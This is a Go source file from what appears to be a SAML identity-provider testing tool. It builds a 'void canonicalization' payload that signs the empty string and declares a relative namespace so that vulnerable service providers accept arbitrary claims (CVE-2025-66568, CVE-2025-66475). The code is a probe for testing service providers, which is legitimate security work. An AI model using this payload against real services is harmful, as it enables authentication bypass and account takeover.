package saml

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"fmt"

	"github.com/beevik/etree"
)

// Parser differential attacks. Each one emits a document that an SP's
// signature-validating parser and its claim-reading parser read differently, so
// the SP verifies one element and then trusts the claims of another. Published
// as "The Fragile Lock" (Zakhar Fedotkin, PortSwigger, 2025).
//
// The published exploit chain needs a legitimately signed donor document,
// because the attacker there cannot sign. Plasmid is the IdP, so it skips the
// donor and emits the malformed structure directly, signing whatever the attack
// needs signed. That makes each mode a single-request probe of the parser bug
// itself rather than a reproduction of the whole chain.
const (
	ParserDiffOff = ""
	// ParserDiffVoidC14N hand-builds the signature over the empty string and
	// declares a relative namespace URI. libxml2 refuses to canonicalize a
	// document containing one, and a vulnerable implementation treats the
	// failure as an empty canonical form, so both the digest and the signature
	// cover nothing at all. It signs with the real IdP key so that the SP's
	// configured certificate matches and canonicalization is the only thing
	// under test. Tracked as CVE-2025-66568 in ruby-saml and CVE-2025-66475 in
	// xmlseclibs.
	ParserDiffVoidC14N = "void_c14n"
)

// emptyStringDigestB64 is the base64 SHA-256 of zero bytes. A vulnerable
// implementation that canonicalized nothing computes exactly this, so it is
// what the void signature has to claim.
var emptyStringDigestB64 = func() string {
	sum := sha256.Sum256(nil)
	return base64.StdEncoding.EncodeToString(sum[:])
}()

type parserDiffSpec struct {
	mode  string
	label string
	help  string
	// validated records that this payload has been shown to bypass a real
	// vulnerable implementation and to be rejected by a patched one. Only
	// validated modes are offered. A payload that merely looks right is worse
	// than nothing: a rejection from the SP would be indistinguishable from the
	// SP being secure, which is the one answer the operator cannot act on.
	validated bool
	build     func(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error)
}

// parserDiffSpecs is the single registration point for the modes: the ordering
// slice, the label map and the help map are all derived from it, so a mode
// cannot be half-added.
var parserDiffSpecs = []parserDiffSpec{
	{
		mode:      ParserDiffVoidC14N,
		label:     "void canonicalization (digest and signature over the empty string)",
		help:      "Signs the empty string with the real IdP key and declares a relative namespace URI so canonicalization fails document-wide. An SP that treats the failure as an empty canonical form accepts any claims you override.",
		validated: true,
		build:     buildVoidC14N,
	},
}

// ParserDiffModes lists the modes in the order the tamper page offers them.
var ParserDiffModes = func() []string {
	var modes []string
	for _, spec := range parserDiffSpecs {
		if spec.validated {
			modes = append(modes, spec.mode)
		}
	}
	return modes
}()

// ParserDiffModeLabels are the human-readable names shown in the UI and
// recorded in the inspector.
var ParserDiffModeLabels = func() map[string]string {
	labels := map[string]string{}
	for _, spec := range parserDiffSpecs {
		if spec.validated {
			labels[spec.mode] = spec.label
		}
	}
	return labels
}()

// ParserDiffModeHelp explains, per mode, what accepting it would mean.
var ParserDiffModeHelp = func() map[string]string {
	help := map[string]string{}
	for _, spec := range parserDiffSpecs {
		if spec.validated {
			help[spec.mode] = spec.help
		}
	}
	return help
}()

func IsParserDiffMode(mode string) bool {
	_, ok := ParserDiffModeLabels[mode]
	return ok
}

func lookupParserDiffSpec(mode string) (parserDiffSpec, bool) {
	for _, spec := range parserDiffSpecs {
		if spec.mode == mode {
			return spec, true
		}
	}
	return parserDiffSpec{}, false
}

// parserDiffOptions holds the payload details that decide whether a given SP's
// parsers actually diverge. They are gathered here, rather than spread through
// the builders, because they are the knobs that get turned while testing a
// payload against a real implementation.
type parserDiffOptions struct {
	RelativeNSPrefix  string
	RelativeNSValue   string
	DeclareOnResponse bool
	DeclareOnSigned   bool
}

var defaultParserDiffOptions = parserDiffOptions{
	RelativeNSPrefix:  "plasmid",
	RelativeNSValue:   "1",
	DeclareOnResponse: true,
	DeclareOnSigned:   true,
}

// ParserDiffer emits the parser-differential payloads. Unlike Resigner it signs
// with the real IdP key rather than generated attacker material: void
// canonicalization only isolates the canonicalization bug if the certificate
// the SP was configured with is the one that signed. It caches nothing and
// keeps no mutable state, so it needs no lock.
type ParserDiffer struct {
	key  *rsa.PrivateKey
	cert *x509.Certificate
}

func NewParserDiffer(key *rsa.PrivateKey, cert *x509.Certificate) *ParserDiffer {
	return &ParserDiffer{key: key, cert: cert}
}

// Apply rewrites a SAML response into the shape the mode calls for and returns
// the new XML plus a description of what it did.
func (p *ParserDiffer) Apply(xmlBytes []byte, mode string) ([]byte, string, error) {
	if !IsParserDiffMode(mode) {
		return nil, "", fmt.Errorf("unknown parser differential mode %q", mode)
	}
	return p.applyWith(xmlBytes, mode, defaultParserDiffOptions)
}

// applyWith is Apply with the payload knobs supplied explicitly. It exists so
// that payload shapes can be swept against a real implementation without
// rebuilding the defaults.
func (p *ParserDiffer) applyWith(xmlBytes []byte, mode string, opt parserDiffOptions) ([]byte, string, error) {
	spec, ok := lookupParserDiffSpec(mode)
	if !ok {
		return nil, "", fmt.Errorf("unknown parser differential mode %q", mode)
	}
	if p == nil || p.key == nil || p.cert == nil {
		return nil, "", fmt.Errorf("parser differential mode %q needs the IdP key and certificate", mode)
	}

	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(xmlBytes); err != nil {
		return nil, "", fmt.Errorf("parse failed: %w", err)
	}
	if doc.Root() == nil {
		return nil, "", fmt.Errorf("no root element")
	}

	detail, err := spec.build(doc, p, opt)
	if err != nil {
		return nil, "", err
	}

	out, err := doc.WriteToBytes()
	if err != nil {
		return nil, "", fmt.Errorf("serialize failed: %w", err)
	}

	desc := spec.label
	if detail != "" {
		desc += " (" + detail + ")"
	}
	return out, desc, nil
}

func buildVoidC14N(doc *etree.Document, p *ParserDiffer, opt parserDiffOptions) (string, error) {
	response := doc.Root()
	targets := signatureTargets(response)
	if len(targets) == 0 {
		return "", fmt.Errorf("void_c14n: response carries no signature to replace")
	}

	for _, el := range targets {
		if err := voidifySignature(el, p.key, p.cert); err != nil {
			return "", err
		}
		if opt.DeclareOnSigned {
			declareNS(el, opt.RelativeNSPrefix, opt.RelativeNSValue)
		}
	}
	if opt.DeclareOnResponse {
		declareNS(response, opt.RelativeNSPrefix, opt.RelativeNSValue)
	}

	return fmt.Sprintf("xmlns:%s=%q, digest %s…", opt.RelativeNSPrefix, opt.RelativeNSValue, emptyStringDigestB64[:12]), nil
}

// voidifySignature replaces an element's signature with one whose digest and
// signature value both cover the empty string.
func voidifySignature(el *etree.Element, key *rsa.PrivateKey, cert *x509.Certificate) error {
	id := el.SelectAttrValue("ID", "")
	if id == "" {
		return fmt.Errorf("void_c14n: %s has no ID to reference", el.Tag)
	}

	removeSignature(el)
	sig, err := voidSignature(id, key, cert)
	if err != nil {
		return err
	}
	// Same reason as the resigner: a schema-validating SP rejects a signature
	// anywhere but directly after Issuer, before it ever checks the signature.
	el.InsertChildAt(issuerIndex(el), sig)
	return nil
}

// voidSignature builds a ds:Signature identical to the one goxmldsig emits for
// an enveloped RSA-SHA256 signature, except that the digest is the hash of the
// empty string and the signature value covers the empty string rather than the
// canonicalized SignedInfo. Keeping the rest byte-identical means an SP that
// rejects this is rejecting the void canonicalization, not the shape.
func voidSignature(refID string, key *rsa.PrivateKey, cert *x509.Certificate) (*etree.Element, error) {
	sigValue, err := signEmptyString(key)
	if err != nil {
		return nil, err
	}

	sig := etree.NewElement("ds:Signature")
	sig.CreateAttr("xmlns:ds", dsNS)

	signedInfo := sig.CreateElement("ds:SignedInfo")
	signedInfo.CreateElement("ds:CanonicalizationMethod").CreateAttr("Algorithm", "http://www.w3.org/2001/10/xml-exc-c14n#")
	signedInfo.CreateElement("ds:SignatureMethod").CreateAttr("Algorithm", "http://www.w3.org/2001/04/xmldsig-more#rsa-sha256")

	ref := signedInfo.CreateElement("ds:Reference")
	ref.CreateAttr("URI", "#"+refID)
	transforms := ref.CreateElement("ds:Transforms")
	transforms.CreateElement("ds:Transform").CreateAttr("Algorithm", "http://www.w3.org/2000/09/xmldsig#enveloped-signature")
	transforms.CreateElement("ds:Transform").CreateAttr("Algorithm", "http://www.w3.org/2001/10/xml-exc-c14n#")
	ref.CreateElement("ds:DigestMethod").CreateAttr("Algorithm", "http://www.w3.org/2001/04/xmlenc#sha256")
	ref.CreateElement("ds:DigestValue").SetText(emptyStringDigestB64)

	sig.CreateElement("ds:SignatureValue").SetText(sigValue)

	keyInfo := sig.CreateElement("ds:KeyInfo")
	x509Data := keyInfo.CreateElement("ds:X509Data")
	x509Data.CreateElement("ds:X509Certificate").SetText(base64.StdEncoding.EncodeToString(cert.Raw))

	return sig, nil
}

// signEmptyString signs zero bytes. PKCS#1 v1.5 is deterministic, so repeated
// probes present byte-identical signatures and results stay comparable.
func signEmptyString(key *rsa.PrivateKey) (string, error) {
	sum := sha256.Sum256(nil)
	sig, err := rsa.SignPKCS1v15(rand.Reader, key, crypto.SHA256, sum[:])
	if err != nil {
		return "", fmt.Errorf("sign empty string: %w", err)
	}
	return base64.StdEncoding.EncodeToString(sig), nil
}

// declareNS adds a namespace declaration, replacing any existing one for the
// same prefix. The prefix matters: libxml2 warns about a relative URI on a
// default xmlns, and an SP that rejects documents carrying parse warnings never
// reaches the attack.
func declareNS(el *etree.Element, prefix, value string) {
	el.CreateAttr("xmlns:"+prefix, value)
}

// signatureTargets returns the elements carrying a signature, mirroring what
// the resigner treats: whichever of the response and the assertion are signed,
// so the SP cannot fall back to the other.
func signatureTargets(response *etree.Element) []*etree.Element {
	var targets []*etree.Element
	if findSignature(response) != nil {
		targets = append(targets, response)
	}
	if assertion := findElement(response, "saml", "Assertion"); assertion != nil && findSignature(assertion) != nil {
		targets = append(targets, assertion)
	}
	return targets
}
